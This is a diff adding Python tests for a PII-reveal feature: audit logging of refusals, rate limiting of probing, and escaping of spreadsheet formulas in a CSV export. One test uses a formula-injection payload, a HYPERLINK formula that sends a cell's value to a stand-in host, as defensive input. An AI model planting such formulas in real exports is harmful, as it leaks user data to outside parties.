@@ -336,3 +336,35 @@ def test_the_ticket_detail_lists_placeholders_with_their_level(api_as, people, t
         {"placeholder": "[CCCD_1]", "level": "sensitive"},
         {"placeholder": "[PASSWORD_1]", "level": "critical"},
     ]
+
+
+def test_a_refused_reveal_is_audited_without_a_value(api_as, people, ticket):
+    """Spec §g: refusals go to audit_log, with the code and placeholder only."""
+    reveal(api_as, people["mai"])
+
+    (refused,) = events("pii_reveal_refused")
+    assert refused.payload == {"reason": "reveal_not_allowed", "placeholder": "[CCCD_1]"}
+    assert refused.actor_id == people["mai"].id
+
+
+def test_refused_attempts_count_toward_the_hourly_limit(api_as, people, ticket, settings):
+    """BR-F5-07: probing with refused reveals runs into the same limit."""
+    limit = settings.THRESHOLDS.pii_reveal.max_per_user_per_hour
+    for _ in range(limit):
+        reveal(api_as, people["duc"], "[PASSWORD_1]")
+
+    response = reveal(api_as, people["duc"])
+
+    assert response.status_code == 429
+    assert not PiiAccessLog.objects.exists()
+    assert [a.payload["reason"] for a in events("security_alert")] == ["reveal_rate_limited"]
+
+
+def test_the_export_neutralises_spreadsheet_formulas(api_as, people, ticket):
+    """A reason a spreadsheet would run as a formula is exported as text."""
+    reveal(api_as, people["duc"], reason='=HYPERLINK("https://x.example/?"&B2,"ok") lookup')
+
+    exported = api_as(people["anh"]).get("/api/pii/access-log.csv").content.decode()
+
+    assert ",'=HYPERLINK(" in exported.replace('"', "")
+    assert ",=HYPERLINK(" not in exported.replace('"', "")
